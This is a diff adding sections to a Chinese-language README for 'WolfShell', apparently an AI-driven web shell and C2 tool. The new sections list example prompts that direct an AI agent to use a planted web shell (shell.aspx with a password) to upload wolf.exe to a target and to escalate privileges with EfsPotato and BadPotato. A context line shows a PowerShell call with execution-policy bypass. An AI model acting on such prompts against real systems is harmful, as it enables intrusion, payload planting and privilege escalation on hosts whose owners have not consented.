@@ -221,6 +221,30 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypas
 ### 5. AI渗透 金刚狼 WolfShell 视频演示
 https://github.com/0x7556/hackvideo/blob/main/Wolf%20AI%20Shell.mov
 
+### 6. AI渗透 金刚狼 文件上传
+
+**示例提示词：**
+- 使用金刚狼 http://192.168.50.106/shell.aspx Wolf8888  上传文件  C:\Users\Administrator\Desktop\TestTest\wolf.exe  到目标 的Public目录
+- 使用金刚狼 ID为9 执行  上传文件  C:\Users\Administrator\Desktop\TestTest\wolf.exe 到目标 的Public目录
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_uploadfile.png)
+
+### 7. AI渗透 金刚狼 EfsPotato提权
+
+**示例提示词：**
+- 使用金刚狼 ID为9 执行EfsPotato执行 whoami
+- 使用金刚狼 http://192.168.50.106/shell.aspx Wolf8888 EfsPotato执行 whoami
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_efspotato.png)
+
+### 8. AI渗透 金刚狼 BadPotato提权
+
+**示例提示词：**
+- 使用金刚狼 ID为9 执行 BadPotato执行 whoami
+- 使用金刚狼 http://192.168.50.106/shell.aspx Wolf8888 BadPotato执行 whoami
+
+![img](https://github.com/0x7556/wolfshell/blob/main/img/ai/ai_badpotato.png)
+
 
 ## 级联控制内网Shell & C2
 
